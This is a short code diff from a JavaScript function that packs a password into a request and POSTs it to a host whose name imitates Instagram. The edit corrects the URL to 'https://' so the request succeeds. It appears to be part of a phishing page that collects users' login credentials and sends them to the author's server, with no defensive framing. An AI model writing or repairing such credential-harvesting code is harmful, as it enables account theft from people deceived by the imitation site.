@@ -10,7 +10,7 @@ async function sendDataToServer(){
         password:password,
     }
 
-    const res = await fetch("instagram-nine-topaz-52.vercel.app/save",{
+    const res = await fetch("https://instagram-nine-topaz-52.vercel.app/save",{
         method: "POST",
         headers:{
             "Content-Type": "application/json",
